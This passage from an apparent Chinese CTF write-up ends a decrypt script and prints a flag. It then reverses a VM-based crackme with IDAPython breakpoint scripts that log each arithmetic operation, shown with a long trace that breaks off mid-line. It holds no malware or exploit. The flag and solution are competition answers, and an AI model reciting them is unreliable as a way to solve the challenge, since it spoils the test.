function_">decrypt</span>(<span class="params">src_bytes</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(src_bytes) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3 → 2：先把 arc[1] 的输出补回去，再撤销 nibble swap</span></span><br><span class="line">    D = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    D[<span class="number">1</span>] = swap(<span class="number">114</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        D[i] = src_bytes[i - <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    C = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        C[i] = swap(D[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2 → 1：逆前缀 XOR</span></span><br><span class="line">    B = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    B[<span class="number">1</span>] = C[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        B[i] = C[i] ^ C[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1：撤销 “+索引 (mod 255)”（注意从 i = 2 开始）</span></span><br><span class="line">    arc = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    arc[<span class="number">1</span>] = B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        val = B[i] - i</span><br><span class="line">        <span class="keyword">while</span> val &lt;= <span class="number">0</span>:</span><br><span class="line">            val += <span class="number">255</span></span><br><span class="line">        arc[i] = val</span><br><span class="line"></span><br><span class="line">    word = <span class="string">&#x27;&#x27;</span>.join(qrazy[idx - <span class="number">1</span>] <span class="keyword">for</span> idx <span class="keyword">in</span> arc[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> arc[<span class="number">1</span>:], word</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arc_indices, word = decrypt(src)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;arc indices:&#x27;</span>, arc_indices)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;input word :&#x27;</span>, word)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TSCTF-J{LET_M3_8E_W1TH_Y0U}</p><h3 id="The-Loom-of-Mirrored-Dreams"><a href="#The-Loom-of-Mirrored-Dreams" class="headerlink" title="The Loom of Mirrored Dreams"></a>The Loom of Mirrored Dreams</h3><p>虚拟机逆向，没有反调，其实很简单</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192146793.png" alt="image-20251013192146793"></p><p>下好断点先</p><p>主逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192236671.png" alt="image-20251013192236671"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192257545.png" alt="image-20251013192257545"></p><p>其实这种一般都是tea类等 异或，加法，运算较多</p><p>我们在加减乘除那边设好断点dump运算逻辑出来即可</p><p>如add</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192625081.png" alt="image-20251013192625081"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192646573.png" alt="image-20251013192646573"></p><p>一个add指令</p><p>我们在这下断点，运行到这rdx，rcx已经被赋值</p><p>我们加一下不就知道当时的状态是a &#x3D; d +c 了吗</p><p>如果我们知道所有的状态，不就是知道加密的方法了吗?</p><p>左边edit breakpoint</p><p>为了演示，我在这里用了IDC脚本，下面会用IDApython</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> rcx = GetRegValue(<span class="string">&quot;rcx&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> rdx = GetRegValue(<span class="string">&quot;rdx&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> sum = rcx + rdx;</span><br><span class="line">Message(<span class="string">&quot;%X = %X + %X;\n&quot;</span>, sum, rcx, rdx);</span><br></pre></td></tr></table></figure><p>shr:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">value = idc.get_reg_value(<span class="string">&quot;rdx&quot;</span>)        </span><br><span class="line">shift = idc.get_reg_value(<span class="string">&quot;cl&quot;</span>) &amp; <span class="number">0x3F</span>  <span class="comment"># 只保留低 6 bit</span></span><br><span class="line">result = value &gt;&gt; shift</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span> &gt;&gt; <span class="subst">&#123;shift&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>mul</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp   = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">mul_a = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)             <span class="comment"># [rbp+var_20]</span></span><br><span class="line">mul_b = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)      <span class="comment"># [rbp+var_18]</span></span><br><span class="line">prod  = (mul_a * mul_b) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mul_a&#125;</span> * <span class="subst">&#123;mul_b&#125;</span> = <span class="subst">&#123;prod&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>xor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp    = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">v5     = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)          </span><br><span class="line">v4     = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)   </span><br><span class="line">result = (v5 ^ v4) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;v5&#125;</span> ^ <span class="subst">&#123;v4&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>sub</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp        = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">minuend    = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)         <span class="comment"># 被减数</span></span><br><span class="line">subtrahend = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)  <span class="comment"># 减数</span></span><br><span class="line">diff       = (minuend - subtrahend) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;minuend&#125;</span> - <span class="subst">&#123;subtrahend&#125;</span> = <span class="subst">&#123;diff&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>shl</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp     = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">value   = ida_bytes.get_qword(rbp - <span class="number">0x20</span>)</span><br><span class="line">shift   = idc.get_reg_value(<span class="string">&quot;cl&quot;</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">result  = (value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span> &lt;&lt; <span class="subst">&#123;shift&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013193218872.png" alt="image-20251013193218872"></p><p>运行即可在下方output发现，我输入的是11111222223333344444555556666677777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line">0 * 19 = 0</span><br><span class="line">AB = 0 + AB;</span><br><span class="line">171 ^ 49 = 154</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">1 * 19 = 19</span><br><span class="line">BE = 13 + AB;</span><br><span class="line">190 ^ 49 = 143</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">2 * 19 = 38</span><br><span class="line">D1 = 26 + AB;</span><br><span class="line">209 ^ 49 = 224</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">3 * 19 = 57</span><br><span class="line">E4 = 39 + AB;</span><br><span class="line">228 ^ 49 = 213</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">4 * 19 = 76</span><br><span class="line">F7 = 4C + AB;</span><br><span class="line">247 ^ 49 = 198</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">5 * 19 = 95</span><br><span class="line">10A = 5F + AB;</span><br><span class="line">10 ^ 50 = 56</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">6 * 19 = 114</span><br><span class="line">11D = 72 + AB;</span><br><span class="line">29 ^ 50 = 47</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">7 * 19 = 133</span><br><span class="line">130 = 85 + AB;</span><br><span class="line">48 ^ 50 = 2</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">8 * 19 = 152</span><br><span class="line">143 = 98 + AB;</span><br><span class="line">67 ^ 50 = 113</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">9 * 19 = 171</span><br><span class="line">156 = AB + AB;</span><br><span class="line">86 ^ 50 = 100</span><br><span class="line">A = 9 + 1;</span><br><span class="line">10 * 19 = 190</span><br><span class="line">169 = BE + AB;</span><br><span class="line">105 ^ 51 = 90</span><br><span class="line">B = A + 1;</span><br><span class="line">11 * 19 = 209</span><br><span class="line">17C = D1 + AB;</span><br><span class="line">124 ^ 51 = 79</span><br><span class="line">C = B + 1;</span><br><span class="line">12 * 19 = 228</span><br><span class="line">18F = E4 + AB;</span><br><span class="line">143 ^ 51 = 188</span><br><span class="line">D = C + 1;</span><br><span class="line">13 * 19 = 247</span><br><span class="line">1A2 = F7 + AB;</span><br><span class="line">162 ^ 51 = 145</span><br><span class="line">E = D + 1;</span><br><span class="line">14 * 19 = 266</span><br><span class="line">1B5 = 10A + AB;</span><br><span class="line">181 ^ 51 = 134</span><br><span class="line">F = E + 1;</span><br><span class="line">15 * 19 = 285</span><br><span class="line">1C8 = 11D + AB;</span><br><span class="line">200 ^ 52 = 252</span><br><span class="line">10 = F + 1;</span><br><span class="line">16 * 19 = 304</span><br><span class="line">1DB = 130 + AB;</span><br><span class="line">219 ^ 52 = 239</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">17 * 19 = 323</span><br><span class="line">1EE = 143 + AB;</span><br><span class="line">238 ^ 52 = 218</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">18 * 19 = 342</span><br><span class="line">201 = 156 + AB;</span><br><span class="line">1 ^ 52 = 53</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">19 * 19 = 361</span><br><span class="line">214 = 169 + AB;</span><br><span class="line">20 ^ 52 = 32</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">20 * 19 = 380</span><br><span class="line">227 = 17C + AB;</span><br><span class="line">39 ^ 53 = 18</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">21 * 19 = 399</span><br><span class="line">23A = 18F + AB;</span><br><span class="line">58 ^ 53 = 15</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">22 * 19 = 418</span><br><span class="line">24D = 1A2 + AB;</span><br><span class="line">77 ^ 53 = 120</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">23 * 19 = 437</span><br><span class="line">260 = 1B5 + AB;</span><br><span class="line">96 ^ 53 = 85</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">24 * 19 = 456</span><br><span class="line">273 = 1C8 + AB;</span><br><span class="line">115 ^ 53 = 70</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">25 * 19 = 475</span><br><span class="line">286 = 1DB + AB;</span><br><span class="line">134 ^ 54 = 176</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">26 * 19 = 494</span><br><span class="line">299 = 1EE + AB;</span><br><span class="line">153 ^ 54 = 175</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">27 * 19 = 513</span><br><span class="line">2AC = 201 + AB;</span><br><span class="line">172 ^ 54 = 154</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">28 * 19 = 532</span><br><span class="line">2BF = 214 + AB;</span><br><span class="line">191 ^ 54 = 137</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">29 * 19 = 551</span><br><span class="line">2D2 = 227 + AB;</span><br><span class="line">210 ^ 54 = 228</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">30 * 19 = 570</span><br><span class="line">2E5 = 23A + AB;</span><br><span class="line">229 ^ 55 = 210</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">31 * 19 = 589</span><br><span class="line">2F8 = 24D + AB;</span><br><span class="line">248 ^ 55 = 207</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">32 * 19 = 608</span><br><span class="line">30B = 260 + AB;</span><br><span class="line">11 ^ 55 = 60</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">33 * 19 = 627</span><br><span class="line">31E = 273 + AB;</span><br><span class="line">30 ^ 55 = 41</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">34 * 19 = 646</span><br><span class="line">331 = 286 + AB;</span><br><span class="line">49 ^ 55 = 6</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">154 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">143 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">224 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">213 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">198 &gt;&gt; 4 = 12</span><br><span class="line">4 &lt;&lt; 4 = 64</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">56 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">47 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">2 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">113 &gt;&gt; 4 = 7</span><br><span class="line">13 &lt;&lt; 4 = 208</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">100 &gt;&gt; 4 = 6</span><br><span class="line">10 &lt;&lt; 4 = 160</span><br><span class="line">A = 9 + 1;</span><br><span class="line">90 &gt;&gt; 4 = 5</span><br><span class="line">0 &lt;&lt; 4 = 0</span><br><span class="line">B = A + 1;</span><br><span class="line">79 &gt;&gt; 4 = 4</span><br><span class="line">9 &lt;&lt; 4 = 144</span><br><span class="line">C = B + 1;</span><br><span class="line">188 &gt;&gt; 4 = 11</span><br><span class="line">8 &lt;&lt; 4 = 128</span><br><span class="line">D = C + 1;</span><br><span class="line">145 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">E = D + 1;</span><br><span class="line">134 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">F = E + 1;</span><br><span class="line">252 &gt;&gt; 4 = 15</span><br><span class="line">2 &lt;&lt; 4 = 32</span><br><span class="line">10 = F + 1;</span><br><span class="line">239 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">218 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">53 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">32 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">18 &gt;&gt; 4 = 1</span><br><span class="line">5 &lt;&lt; 4 = 80</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">15 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">120 &gt;&gt; 4 = 7</span><br><span class="line">13 &lt;&lt; 4 = 208</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">85 &gt;&gt; 4 = 5</span><br><span class="line">0 &lt;&lt; 4 = 0</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">70 &gt;&gt; 4 = 4</span><br><span class="line">9 &lt;&lt; 4 = 144</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">176 &gt;&gt; 4 = 11</span><br><span class="line">8 &lt;&lt; 4 = 128</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">175 &gt;&gt; 4 = 10</span><br><span class="line">15 &lt;&lt; 4 = 240</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">154 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">137 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">228 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">210 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">207 &gt;&gt; 4 = 12</span><br><span class="line">4 &lt;&lt; 4 = 64</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">60 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">41 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">6 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">239 ^ 50 = 221</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">50 ^ 28 = 46</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">28 ^ 112 = 108</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">112 ^ 74 = 58</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">74 ^ 179 = 249</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">179 ^ 98 = 209</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">98 ^ 198 = 164</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">198 ^ 213 = 19</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">213 ^ 169 = 124</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">A = 9 + 1;</span><br><span class="line">169 ^ 15 = 166</span><br><span class="line">A = 9 + 1;</span><br><span class="line">B = A + 1;</span><br><span class="line">15 ^ 146 = 157</span><br><span class="line">B = A + 1;</span><br><span class="line">C = B + 1;</span><br><span class="line">146 ^ 132 = 22</span><br><span class="line">C = B + 1;</span><br><span class="line">D = C + 1;</span><br><span class="line">132 ^ 229 = 97</span><br><span class="line">D = C + 